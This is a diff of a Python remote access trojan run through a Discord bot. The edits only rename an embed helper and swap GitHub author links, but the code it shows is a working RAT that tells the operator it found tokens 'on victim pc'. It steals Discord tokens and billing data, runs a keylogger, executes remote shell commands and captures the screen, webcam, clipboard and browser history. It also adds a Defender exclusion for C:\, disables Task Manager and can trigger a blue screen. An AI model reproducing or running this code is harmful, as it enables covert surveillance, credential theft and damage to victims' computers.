@@ -57,11 +57,11 @@ intents.message_content = True
 
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
-def navi_embed(text, color=0x00aaff, thumbnail=True):
+def kev_embed(text, color=0x00aaff, thumbnail=True):
     embed = discord.Embed(title="kev • TERMINAL", description=text, color=color)
     if thumbnail:
         embed.set_thumbnail(url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png")
-    embed.set_footer(text="kev Multitool • https://github.com/glockinhand/navi-multitool", icon_url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png")
+    embed.set_footer(text="kev Multitool • https://github.com/ns-demon/navi-multitool", icon_url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png")
     return embed
 
 def hide_script():
@@ -434,7 +434,7 @@ async def on_ready():
     )
     embed.set_thumbnail(url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png")
     embed.set_footer(
-        text="kev Multitool • github.com/glockinhand/kev-multitool",
+        text="kev Multitool • github.com/ns-demon/kev-multitool",
         icon_url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png"
     )
     await channel.send(content="@here", embed=embed)
@@ -792,7 +792,7 @@ def get_embed(page: str):
             "`!kill <session/all>`"
         )
 
-    e.set_footer(text="kev Rat • github.com/glockinhand/navi-multitool")
+    e.set_footer(text="kev Rat • github.com/ns-demon/navi-multitool")
     return e
 
 class HelpSelect(discord.ui.Select):
@@ -983,7 +983,7 @@ async def roblox(ctx):
     else:
         embed.add_field(name="Token", value=f"```\n{token}\n```", inline=False)
 
-    embed.set_footer(text=f"kev Multitool | https://github.com/glockinhand")
+    embed.set_footer(text=f"kev Multitool | https://github.com/ns-demon")
 
     await ctx.send(embed=embed)
 
@@ -1025,7 +1025,7 @@ async def grab_tokens(ctx):
         embed.add_field(name=":gem: Nitro:", value=t['n'], inline=False)
         embed.add_field(name=":money_with_wings: Billing:", value=t['b'], inline=False)
         embed.add_field(name=":key: Token:", value=f"```{t['t']}```", inline=False)
-        embed.set_footer(text="kev Rat • github.com/glockinhand/navi-multitool")
+        embed.set_footer(text="kev Rat • github.com/ns-demon/navi-multitool")
         embeds_to_send.append(embed)
     await ctx.send(embeds=embeds_to_send)
     await ctx.send(f"kev found **{len(embeds_to_send)}** tokens on victim pc.")
@@ -1042,15 +1042,15 @@ async def on_message(message):
             try:
                 channel_to_delete = discord.utils.get(bot.get_all_channels(), name=message.content[6:])
                 await channel_to_delete.delete()
-                await message.channel.send(embed=navi_embed(f"Session `{message.content[6:]}` killed.", color=0xff0000))
+                await message.channel.send(embed=kev_embed(f"Session `{message.content[6:]}` killed.", color=0xff0000))
             except:
-                await message.channel.send(embed=navi_embed(f"Session `{message.content[6:]}` is invalid. Please enter a valid session name.", color=0xff0000))
+                await message.channel.send(embed=kev_embed(f"Session `{message.content[6:]}` is invalid. Please enter a valid session name.", color=0xff0000))
 
     if message.content == "!dumpkeylogger":
         temp = os.getenv("TEMP")
         file_keys = os.path.join(os.getenv('TEMP') + "\\key_log.txt")
         file = discord.File(file_keys, filename=file_keys)
-        await message.channel.send(embed=navi_embed("📋 **Keylogger Dump:** Logs retrieved successfully."), file=file)
+        await message.channel.send(embed=kev_embed("📋 **Keylogger Dump:** Logs retrieved successfully."), file=file)
         os.remove(os.path.join(os.getenv('TEMP') + "\\key_log.txt"))
 
     if message.content == "!exit":
@@ -1062,11 +1062,11 @@ async def on_message(message):
         global _thread
         _thread = threading.Thread(target=between_callback, args=(bot,))
         _thread.start()
-        await message.channel.send(embed=navi_embed("Window logging for this session started."))
+        await message.channel.send(embed=kev_embed("Window logging for this session started."))
 
     if message.content == "!windowstop":
         stop_threads = True
-        await message.channel.send(embed=navi_embed("Window logging for this session stopped."))
+        await message.channel.send(embed=kev_embed("Window logging for this session stopped."))
         game = discord.Game(f"Window logging stopped")
         await bot.change_presence(status=discord.Status.online, activity=game)
 
@@ -1074,16 +1074,16 @@ async def on_message(message):
         with mss() as sct:
             sct.shot(output=os.path.join(os.getenv('TEMP') + "\\monitor.png"))
         file = discord.File(os.path.join(os.getenv('TEMP') + "\\monitor.png"), filename="monitor.png")
-        await message.channel.send(embed=navi_embed("📸 **Screenshot:** Capture completed."), file=file)
+        await message.channel.send(embed=kev_embed("📸 **Screenshot:** Capture completed."), file=file)
         os.remove(os.path.join(os.getenv('TEMP') + "\\monitor.png"))
 
     if message.content == "!volumemax":
         volumeup()
-        await message.channel.send(embed=navi_embed("🔊 **Volume:** Set to 100%."))
+        await message.channel.send(embed=kev_embed("🔊 **Volume:** Set to 100%."))
 
     if message.content == "!volumezero":
         volumedown()
-        await message.channel.send(embed=navi_embed("🔇 **Volume:** Muted (0%)."))
+        await message.channel.send(embed=kev_embed("🔇 **Volume:** Muted (0%)."))
 
     if message.content == "!webcampic":
         directory = os.getcwd()
@@ -1094,7 +1094,7 @@ async def on_message(message):
                 zipObj.extractall()
             os.system("WebCamImageSave.exe /capture /FileName temp.png")
             file = discord.File("temp.png", filename="temp.png")
-            await message.channel.send(embed=navi_embed("📷 **Webcam:** Image captured."), file=file)
+            await message.channel.send(embed=kev_embed("📷 **Webcam:** Image captured."), file=file)
             os.remove("temp.zip")
             os.remove("temp.png")
             os.remove("WebCamImageSave.exe")
@@ -1102,7 +1102,7 @@ async def on_message(message):
             os.remove("WebCamImageSave.chm")
             os.chdir(directory)
         except:
-            await message.channel.send(embed=navi_embed("Command failed.", color=0xff0000))
+            await message.channel.send(embed=kev_embed("Command failed.", color=0xff0000))
 
     if message.content.startswith("!message"):
         MB_YESNO = 0x04
@@ -1125,11 +1125,11 @@ async def on_message(message):
         path = os.path.join(os.getenv('TEMP') + "\\temp.jpg")
         await message.attachments[0].save(path)
         ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
-        await message.channel.send(embed=navi_embed("🖼️ **System:** Wallpaper successfully updated."))
+        await message.channel.send(embed=kev_embed("🖼️ **System:** Wallpaper successfully updated."))
 
     if message.content.startswith("!upload"):
         await message.attachments[0].save(message.content[8:])
-        await message.channel.send(embed=navi_embed("📤 **File Transfer:** Upload successful."))
+        await message.channel.send(embed=kev_embed("📤 **File Transfer:** Upload successful."))
 
     if message.content.startswith("!shell"):
         global status
@@ -1151,27 +1151,27 @@ async def on_message(message):
             numb = len(result)
             print(numb)
             if numb < 1:
-                await message.channel.send(embed=navi_embed("Command not recognized or no output was obtained.", color=0xff0000))
+                await message.channel.send(embed=kev_embed("Command not recognized or no output was obtained.", color=0xff0000))
             elif numb > 1990:
                 f1 = open("output.txt", 'a')
                 f1.write(result)
                 f1.close()
                 file = discord.File("output.txt", filename="output.txt")
-                await message.channel.send(embed=navi_embed("✅ **Shell Execution:** Command completed successfully."), file=file)
+                await message.channel.send(embed=kev_embed("✅ **Shell Execution:** Command completed successfully."), file=file)
                 os.popen("del output.txt")
             else:
-                await message.channel.send(embed=navi_embed(f"✅ **Execution Results:**\n```\n{result}\n```"))
+                await message.channel.send(embed=kev_embed(f"✅ **Execution Results:**\n```\n{result}\n```"))
         else:
-            await message.channel.send(embed=navi_embed("Command not recognized or no output was obtained.", color=0xff0000))
+            await message.channel.send(embed=kev_embed("Command not recognized or no output was obtained.", color=0xff0000))
             status = None
 
     if message.content.startswith("!download"):
         file = discord.File(message.content[10:], filename=message.content[10:])
-        await message.channel.send(embed=navi_embed("📥 **File Transfer:** Download completed."), file=file)
+        await message.channel.send(embed=kev_embed("📥 **File Transfer:** Download completed."), file=file)
 
     if message.content.startswith("!cd"):
         os.chdir(message.content[4:])
-        await message.channel.send(embed=navi_embed(f"📂 **Directory Update:** Current path: `{os.getcwd()}`"))
+        await message.channel.send(embed=kev_embed(f"📂 **Directory Update:** Current path: `{os.getcwd()}`"))
 
     if message.content.startswith("!write"):
         if message.content[7:] == "enter":
@@ -1185,7 +1185,7 @@ async def on_message(message):
         with open("history.txt","a") as hist:
             hist.write(str(strobj))
         file = discord.File("history.txt", filename="history.txt")
-        await message.channel.send(embed=navi_embed("🌐 **Browser History:** Logs retrieved."), file=file)
+        await message.channel.send(embed=kev_embed("🌐 **Browser History:** Logs retrieved."), file=file)
         os.remove("history.txt")
 
     if message.content == "!clipboard":
@@ -1205,7 +1205,7 @@ async def on_message(message):
             kernel32.GlobalUnlock(data_locked)
             body = value.decode()
             user32.CloseClipboard()
-            await message.channel.send(embed=navi_embed(f"**Clipboard Content:**\n```\n{body}\n```"))
+            await message.channel.send(embed=kev_embed(f"**Clipboard Content:**\n```\n{body}\n```"))
 
     if message.content.startswith("!stopsing"):
         os.system(f"taskkill /F /IM {pid_process[1]}")
@@ -1214,25 +1214,25 @@ async def on_message(message):
         info = platform.uname()
         info_total = f'{info.system} {info.release} {info.machine}'
         ip = get('https://api.ipify.org').text
-        await message.channel.send(embed=navi_embed(f"**System Info:**\n`{info_total}`\n**IP:** `{ip}`"))
+        await message.channel.send(embed=kev_embed(f"**System Info:**\n`{info_total}`\n**IP:** `{ip}`"))
 
     if message.content == "!geolocate":
         with urllib.request.urlopen("https://geolocation-db.com/json") as url:
             data = json.loads(url.read().decode())
             link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
-            await message.channel.send(embed=navi_embed(f"**Geolocate Result:** [Google Maps]({link})"))
+            await message.channel.send(embed=kev_embed(f"**Geolocate Result:** [Google Maps]({link})"))
 
     if message.content == "!admincheck":
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin:
-            await message.channel.send(embed=navi_embed("Admin privileges confirmed. :gem:", color=0x00ff00))
+            await message.channel.send(embed=kev_embed("Admin privileges confirmed. :gem:", color=0x00ff00))
         else:
-            await message.channel.send(embed=navi_embed("User does not have admin privileges.", color=0xff0000))
+            await message.channel.send(embed=kev_embed("User does not have admin privileges.", color=0xff0000))
 
     if message.content == "!getadmin":
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin:
-            await message.channel.send(embed=navi_embed("✅ Already running with admin privileges.", color=0x00ff00))
+            await message.channel.send(embed=kev_embed("✅ Already running with admin privileges.", color=0x00ff00))
         else:
             try:
                 path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
@@ -1240,11 +1240,11 @@ async def on_message(message):
                     ctypes.windll.shell32.ShellExecuteW(None, "runas", path, "", None, 0)
                 else:
                     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{path}"', None, 0)
-                await message.channel.send(embed=navi_embed("🔑 **UAC:** Admin prompt sent. A new admin session will connect shortly."))
+                await message.channel.send(embed=kev_embed("🔑 **UAC:** Admin prompt sent. A new admin session will connect shortly."))
                 await asyncio.sleep(3)
                 exit()
             except Exception as e:
-                await message.channel.send(embed=navi_embed(f"Failed to request admin: `{str(e)}`", color=0xff0000))
+                await message.channel.send(embed=kev_embed(f"Failed to request admin: `{str(e)}`", color=0xff0000))
 
     if message.content == "!disabledefender":
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
@@ -1255,11 +1255,11 @@ async def on_message(message):
                 capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
             )
             if result.returncode == 0:
-                await message.channel.send(embed=navi_embed("🛡️ **Defender:** Exclusion added for `C:\\`. Entire drive is now excluded."))
+                await message.channel.send(embed=kev_embed("🛡️ **Defender:** Exclusion added for `C:\\`. Entire drive is now excluded."))
             else:
-                await message.channel.send(embed=navi_embed(f"Defender exclusion failed: `{result.stderr.strip()}`", color=0xff0000))
+                await message.channel.send(embed=kev_embed(f"Defender exclusion failed: `{result.stderr.strip()}`", color=0xff0000))
         else:
-            await message.channel.send(embed=navi_embed("Admin rights required for Defender exclusions.", color=0xff0000))
+            await message.channel.send(embed=kev_embed("Admin rights required for Defender exclusions.", color=0xff0000))
 
     if message.content.startswith("!sing"):
         volumeup()
@@ -1299,11 +1299,11 @@ async def on_message(message):
         test._running = True
         test.daemon = True
         test.start()
-        await message.channel.send(embed=navi_embed("⌨️ **Keylogger:** Service started."))
+        await message.channel.send(embed=kev_embed("⌨️ **Keylogger:** Service started."))
 
     if message.content == "!stopkeylogger":
         test._running = False
-        await message.channel.send(embed=navi_embed("🛑 **Keylogger:** Service stopped."))
+        await message.channel.send(embed=kev_embed("🛑 **Keylogger:** Service stopped."))
 
     if message.content == "!idletime":
         class LASTINPUTINFO(Structure):
@@ -1326,7 +1326,7 @@ async def on_message(message):
         idle1.daemon = True
         idle1.start()
         duration = get_idle_duration()
-        await message.channel.send(embed=navi_embed(f"User has been idle for `{duration:.2f}` seconds."))
+        await message.channel.send(embed=kev_embed(f"User has been idle for `{duration:.2f}` seconds."))
         time.sleep(1)
 
     if message.content.startswith("!voice"):
@@ -1334,23 +1334,23 @@ async def on_message(message):
         speak = wincl.Dispatch("SAPI.SpVoice")
         speak.Speak(message.content[7:])
         comtypes.CoUninitialize()
-        await message.channel.send(embed=navi_embed("🗣️ **Voice:** Command executed."))
+        await message.channel.send(embed=kev_embed("🗣️ **Voice:** Command executed."))
 
     if message.content.startswith("!blockinput"):
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin:
             ok = windll.user32.BlockInput(True)
-            await message.channel.send(embed=navi_embed("🔒 **System:** User input blocked."))
+            await message.channel.send(embed=kev_embed("🔒 **System:** User input blocked."))
         else:
-            await message.channel.send(embed=navi_embed("Admin rights are required for this operation.", color=0xff0000))
+            await message.channel.send(embed=kev_embed("Admin rights are required for this operation.", color=0xff0000))
 
     if message.content.startswith("!unblockinput"):
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin:
             ok = windll.user32.BlockInput(False)
-            await message.channel.send(embed=navi_embed("🔓 **System:** User input restored."))
+            await message.channel.send(embed=kev_embed("🔓 **System:** User input restored."))
         else:
-            await message.channel.send(embed=navi_embed("Admin rights are required for this operation.", color=0xff0000))
+            await message.channel.send(embed=kev_embed("Admin rights are required for this operation.", color=0xff0000))
 
     if message.content.startswith("!screenrecord"):
         try:
@@ -1359,7 +1359,7 @@ async def on_message(message):
                 seconds = 1
             if seconds > 30:
                 seconds = 30
-            await message.channel.send(embed=navi_embed(f"🎬 **Screen Recording:** Capturing {seconds}s..."))
+            await message.channel.send(embed=kev_embed(f"🎬 **Screen Recording:** Capturing {seconds}s..."))
             temp = os.getenv('TEMP')
             frames_dir = os.path.join(temp, "navi_frames")
             os.makedirs(frames_dir, exist_ok=True)
@@ -1377,7 +1377,7 @@ async def on_message(message):
                 for f in frame_files:
                     zf.write(f, os.path.basename(f))
             file = discord.File(zip_path, filename="screen_recording.zip")
-            await message.channel.send(embed=navi_embed(f"🎬 **Screen Recording:** {seconds}s captured ({len(frame_files)} frames @ {fps}fps)."), file=file)
+            await message.channel.send(embed=kev_embed(f"🎬 **Screen Recording:** {seconds}s captured ({len(frame_files)} frames @ {fps}fps)."), file=file)
             for f in frame_files:
                 try:
                     os.remove(f)
@@ -1389,9 +1389,9 @@ async def on_message(message):
                 pass
             os.remove(zip_path)
         except ValueError:
-            await message.channel.send(embed=navi_embed("Syntax: `!screenrecord <seconds>` (1-30)", color=0xff0000))
+            await message.channel.send(embed=kev_embed("Syntax: `!screenrecord <seconds>` (1-30)", color=0xff0000))
         except Exception as e:
-            await message.channel.send(embed=navi_embed(f"Screen recording failed: `{str(e)}`", color=0xff0000))
+            await message.channel.send(embed=kev_embed(f"Screen recording failed: `{str(e)}`", color=0xff0000))
 
     if message.content.startswith("!flipscreen"):
         try:
@@ -1402,7 +1402,7 @@ async def on_message(message):
                 ctypes.windll.user32.ShowWindow(taskbar, 5)
                 progman = ctypes.windll.user32.FindWindowW("Progman", None)
                 ctypes.windll.user32.SendMessageW(progman, 0x0111, 0x7402, 0)
-                await message.channel.send(embed=navi_embed("🔄 **Display:** Taskbar & icons restored. Use `!wallpaper` to fix wallpaper."))
+                await message.channel.send(embed=kev_embed("🔄 **Display:** Taskbar & icons restored. Use `!wallpaper` to fix wallpaper."))
             else:
                 with mss() as sct:
                     sct.shot(output=os.path.join(temp, "flip_ss.png"))
@@ -1416,16 +1416,16 @@ async def on_message(message):
                 ctypes.windll.user32.SendMessageW(progman, 0x0111, 0x7402, 0)
                 taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
                 ctypes.windll.user32.ShowWindow(taskbar, 0)
-                await message.channel.send(embed=navi_embed("🔄 **Display:** Screen flipped. Use `!flipscreen reset` to undo."))
+                await message.channel.send(embed=kev_embed("🔄 **Display:** Screen flipped. Use `!flipscreen reset` to undo."))
         except Exception as e:
-            await message.channel.send(embed=navi_embed(f"Flip failed: `{str(e)}`", color=0xff0000))
+            await message.channel.send(embed=kev_embed(f"Flip failed: `{str(e)}`", color=0xff0000))
 
     if message.content.startswith("!crazymouse"):
         try:
             sec = int(message.content[12:].strip())
             if sec < 1: sec = 1
             if sec > 60: sec = 60
-            await message.channel.send(embed=navi_embed(f"🐭 **Mouse:** Going crazy for {sec}s..."))
+            await message.channel.send(embed=kev_embed(f"🐭 **Mouse:** Going crazy for {sec}s..."))
             def _crazy_mouse():
                 end_t = time.time() + sec
                 sw, sh = pyautogui.size()
@@ -1433,14 +1433,14 @@ async def on_message(message):
                     pyautogui.moveTo(random.randint(0, sw), random.randint(0, sh), duration=0.05)
             threading.Thread(target=_crazy_mouse, daemon=True).start()
         except ValueError:
-            await message.channel.send(embed=navi_embed("Syntax: `!crazymouse <seconds>` (1-60)", color=0xff0000))
+            await message.channel.send(embed=kev_embed("Syntax: `!crazymouse <seconds>` (1-60)", color=0xff0000))
 
     if message.content.startswith("!earthquake"):
         try:
             sec = int(message.content[12:].strip())
             if sec < 1: sec = 1
             if sec > 30: sec = 30
-            await message.channel.send(embed=navi_embed(f"🌍 **Earthquake:** Shaking for {sec}s..."))
+            await message.channel.send(embed=kev_embed(f"🌍 **Earthquake:** Shaking for {sec}s..."))
             def _shake():
                 end_t = time.time() + sec
                 while time.time() < end_t:
@@ -1455,7 +1455,7 @@ async def on_message(message):
                     time.sleep(0.04)
             threading.Thread(target=_shake, daemon=True).start()
         except ValueError:
-            await message.channel.send(embed=navi_embed("Syntax: `!earthquake <seconds>` (1-30)", color=0xff0000))
+            await message.channel.send(embed=kev_embed("Syntax: `!earthquake <seconds>` (1-30)", color=0xff0000))
 
     if message.content.startswith("!fakeerror"):
         try:
@@ -1466,9 +1466,9 @@ async def on_message(message):
                 for _ in range(count):
                     ctypes.windll.user32.MessageBoxW(0, txt, "Critical Error", 0x10)
             threading.Thread(target=_spam_err, daemon=True).start()
-            await message.channel.send(embed=navi_embed(f"⚠️ **Fake Error:** Spawning {count} error boxes."))
+            await message.channel.send(embed=kev_embed(f"⚠️ **Fake Error:** Spawning {count} error boxes."))
         except:
-            await message.channel.send(embed=navi_embed("Syntax: `!fakeerror <count> <text>`", color=0xff0000))
+            await message.channel.send(embed=kev_embed("Syntax: `!fakeerror <count> <text>`", color=0xff0000))
 
     if message.content.startswith("!spamtts"):
         try:
@@ -1482,25 +1482,25 @@ async def on_message(message):
                     speak.Speak(txt)
                 comtypes.CoUninitialize()
             threading.Thread(target=_spam_tts, daemon=True).start()
-            await message.channel.send(embed=navi_embed(f"🗣️ **TTS Spam:** Speaking '{txt}' x{count}."))
+            await message.channel.send(embed=kev_embed(f"🗣️ **TTS Spam:** Speaking '{txt}' x{count}."))
         except:
-            await message.channel.send(embed=navi_embed("Syntax: `!spamtts <count> <text>`", color=0xff0000))
+            await message.channel.send(embed=kev_embed("Syntax: `!spamtts <count> <text>`", color=0xff0000))
 
     if message.content == "!opencd":
         ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
-        await message.channel.send(embed=navi_embed("💿 **CD Tray:** Opened."))
+        await message.channel.send(embed=kev_embed("💿 **CD Tray:** Opened."))
 
     if message.content == "!closecd":
         ctypes.windll.winmm.mciSendStringW("set cdaudio door closed", None, 0, None)
-        await message.channel.send(embed=navi_embed("💿 **CD Tray:** Closed."))
+        await message.channel.send(embed=kev_embed("💿 **CD Tray:** Closed."))
 
     if message.content == "!swapbuttons":
         ctypes.windll.user32.SwapMouseButton(True)
-        await message.channel.send(embed=navi_embed("🖱️ **Mouse:** Buttons swapped (left ↔ right)."))
+        await message.channel.send(embed=kev_embed("🖱️ **Mouse:** Buttons swapped (left ↔ right)."))
 
     if message.content == "!unswapbuttons":
         ctypes.windll.user32.SwapMouseButton(False)
-        await message.channel.send(embed=navi_embed("🖱️ **Mouse:** Buttons restored to normal."))
+        await message.channel.send(embed=kev_embed("🖱️ **Mouse:** Buttons restored to normal."))
 
     if message.content == "!hidedesktop":
         try:
@@ -1517,19 +1517,19 @@ async def on_message(message):
             await asyncio.sleep(1)
             subprocess.Popen(["explorer.exe"], creationflags=subprocess.CREATE_NO_WINDOW)
             label = "hidden" if new_val else "restored"
-            await message.channel.send(embed=navi_embed(f"🖥️ **Desktop:** Icons {label}."))
+            await message.channel.send(embed=kev_embed(f"🖥️ **Desktop:** Icons {label}."))
         except Exception as e:
-            await message.channel.send(embed=navi_embed(f"Failed: `{str(e)}`", color=0xff0000))
+            await message.channel.send(embed=kev_embed(f"Failed: `{str(e)}`", color=0xff0000))
 
     if message.content == "!bsod":
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin:
-            await message.channel.send(embed=navi_embed("💀 **BSOD:** Triggering blue screen..."))
+            await message.channel.send(embed=kev_embed("💀 **BSOD:** Triggering blue screen..."))
             nullptr = ctypes.c_int(0)
             ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(nullptr))
             ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(nullptr))
         else:
-            await message.channel.send(embed=navi_embed("Admin rights required for BSOD.", color=0xff0000))
+            await message.channel.send(embed=kev_embed("Admin rights required for BSOD.", color=0xff0000))
 
     if message.content == "!jumpscare":
         try:
@@ -1553,26 +1553,26 @@ async def on_message(message):
                     ctypes.windll.kernel32.Beep(2500, 400)
                     time.sleep(0.1)
             threading.Thread(target=_beep_scare, daemon=True).start()
-            await message.channel.send(embed=navi_embed("👻 **Jumpscare:** Executed."))
+            await message.channel.send(embed=kev_embed("👻 **Jumpscare:** Executed."))
         except Exception as e:
-            await message.channel.send(embed=navi_embed(f"Jumpscare failed: `{str(e)}`", color=0xff0000))
+            await message.channel.send(embed=kev_embed(f"Jumpscare failed: `{str(e)}`", color=0xff0000))
 
     if message.content.startswith("!shutdown"):
         try:
             sec = int(message.content[9:].strip())
             if sec < 0: sec = 0
             subprocess.run(["shutdown", "/s", "/t", str(sec), "/f"], creationflags=subprocess.CREATE_NO_WINDOW)
-            await message.channel.send(embed=navi_embed(f"⏻ **System:** Shutdown in {sec}s."))
+            await message.channel.send(embed=kev_embed(f"⏻ **System:** Shutdown in {sec}s."))
         except ValueError:
-            await message.channel.send(embed=navi_embed("Syntax: `!shutdown <seconds>`", color=0xff0000))
+            await message.channel.send(embed=kev_embed("Syntax: `!shutdown <seconds>`", color=0xff0000))
 
     if message.content == "!restart":
         subprocess.run(["shutdown", "/r", "/t", "0", "/f"], creationflags=subprocess.CREATE_NO_WINDOW)
-        await message.channel.send(embed=navi_embed("🔄 **System:** Restarting now."))
+        await message.channel.send(embed=kev_embed("🔄 **System:** Restarting now."))
 
     if message.content == "!logoff":
         subprocess.run(["shutdown", "/l", "/f"], creationflags=subprocess.CREATE_NO_WINDOW)
-        await message.channel.send(embed=navi_embed("🚪 **System:** User logged off."))
+        await message.channel.send(embed=kev_embed("🚪 **System:** User logged off."))
 
     if message.content == "!disabletaskmgr":
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
@@ -1583,11 +1583,11 @@ async def on_message(message):
                 key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
                 winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
                 winreg.CloseKey(key)
-                await message.channel.send(embed=navi_embed("🚫 **System:** Task Manager disabled."))
+                await message.channel.send(embed=kev_embed("🚫 **System:** Task Manager disabled."))
             except Exception as e:
-                await message.channel.send(embed=navi_embed(f"Failed: `{str(e)}`", color=0xff0000))
+                await message.channel.send(embed=kev_embed(f"Failed: `{str(e)}`", color=0xff0000))
         else:
-            await message.channel.send(embed=navi_embed("Admin rights required.", color=0xff0000))
+            await message.channel.send(embed=kev_embed("Admin rights required.", color=0xff0000))
 
     if message.content == "!enabletaskmgr":
         try:
@@ -1595,29 +1595,29 @@ async def on_message(message):
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
             winreg.DeleteValue(key, "DisableTaskMgr")
             winreg.CloseKey(key)
-            await message.channel.send(embed=navi_embed("✅ **System:** Task Manager re-enabled."))
+            await message.channel.send(embed=kev_embed("✅ **System:** Task Manager re-enabled."))
         except Exception as e:
-            await message.channel.send(embed=navi_embed(f"Failed: `{str(e)}`", color=0xff0000))
+            await message.channel.send(embed=kev_embed(f"Failed: `{str(e)}`", color=0xff0000))
 
     if message.content == "!critproc":
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin:
             ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
-            await message.channel.send(embed=navi_embed("☠️ **System:** Process marked as critical. Killing it will cause BSOD."))
+            await message.channel.send(embed=kev_embed("☠️ **System:** Process marked as critical. Killing it will cause BSOD."))
         else:
-            await message.channel.send(embed=navi_embed("Admin rights required.", color=0xff0000))
+            await message.channel.send(embed=kev_embed("Admin rights required.", color=0xff0000))
 
     if message.content == "!uncritproc":
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin:
             ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
-            await message.channel.send(embed=navi_embed("✅ **System:** Critical flag removed from process."))
+            await message.channel.send(embed=kev_embed("✅ **System:** Critical flag removed from process."))
         else:
-            await message.channel.send(embed=navi_embed("Admin rights required.", color=0xff0000))
+            await message.channel.send(embed=kev_embed("Admin rights required.", color=0xff0000))
 
     if message.content == "!rickroll":
         os.startfile("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-        await message.channel.send(embed=navi_embed("🎵 **Rickroll:** Never gonna give you up..."))
+        await message.channel.send(embed=kev_embed("🎵 **Rickroll:** Never gonna give you up..."))
 
     if message.content.startswith("!beep"):
         try:
@@ -1628,9 +1628,9 @@ async def on_message(message):
                     freq = random.randint(200, 5000)
                     ctypes.windll.kernel32.Beep(freq, 200)
             threading.Thread(target=_beep_spam, daemon=True).start()
-            await message.channel.send(embed=navi_embed(f"🔊 **Beep:** Spamming {count} beeps."))
+            await message.channel.send(embed=kev_embed(f"🔊 **Beep:** Spamming {count} beeps."))
         except ValueError:
-            await message.channel.send(embed=navi_embed("Syntax: `!beep <count>`", color=0xff0000))
+            await message.channel.send(embed=kev_embed("Syntax: `!beep <count>`", color=0xff0000))
 
     await bot.process_commands(message)
 
